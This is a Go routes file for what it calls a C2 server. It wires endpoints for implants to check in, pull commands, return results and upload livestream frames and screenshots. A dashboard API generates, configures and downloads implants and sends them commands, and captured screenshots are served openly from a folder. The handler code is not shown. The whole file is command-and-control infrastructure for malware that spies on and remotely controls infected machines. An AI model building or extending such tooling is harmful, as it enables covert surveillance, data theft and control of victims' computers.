// Package routes awesomeProject/routes/routes.go
package routes

import (
	"awesomeProject/controllers"
	"awesomeProject/middleware"
	"github.com/gin-gonic/gin"
	"path/filepath" // NEW IMPORT
)

func SetupRouter() *gin.Engine {
	r := gin.Default()

	// --- Serve Static Screenshot Files ---
	// This route should ideally be more secure in a production environment
	// (e.g., using signed URLs or a short-lived token in the query param
	// that the main app can generate)
	// For now, it's open but relies on the obscurity of implant_token and filename.
	// The path "c2_screenshots" should match where `saveScreenshotToFile` saves files.
	absScreenshotPath, _ := filepath.Abs("./c2_screenshots") // Get absolute path
	r.StaticFS("/c2_screenshots", gin.Dir(absScreenshotPath, false))
	// Example URL: /screenshots/implant-token-guid/screenshot_cmd123_timestamp.png
	// IMPORTANT: Ensure the `c2_screenshots` directory exists at the root of your C2 server executable.

	// Public routes for implant communication
	r.POST("/checkin", controllers.CheckinImplant)
	r.GET("/implant-client/:unique_token/commands", controllers.ImplantClientFetchCommands)
	r.POST("/command-result", controllers.HandleCommandResult)
	r.POST("/livestream-frame", controllers.HandleLivestreamFrame) // <-- ADD THIS LINE

	// Public routes for user auth
	r.POST("/register", controllers.Register)
	r.POST("/login", controllers.Login)

	// Protected routes (for Dashboard UI)
	protected := r.Group("/api")
	protected.Use(middleware.AuthMiddleware())
	{
		protected.GET("/implants", controllers.GetUserImplants)
		protected.POST("/generate-implant", controllers.GenerateImplant)
		protected.POST("/send-command", controllers.SendCommand)
		protected.GET("/implants/:implant_id/commands", controllers.DashboardGetCommandsForImplant)
		protected.DELETE("/implants/:implant_id", controllers.DeleteImplant)
		protected.POST("/implants/:implant_id/download-configured", controllers.DownloadConfiguredImplant)
		protected.GET("/implants/:implant_id/download", controllers.DownloadImplant) // Legacy/generic
		protected.GET("/implants/:implant_id/screenshots", controllers.GetScreenshotsForImplant)
	}

	return r
}
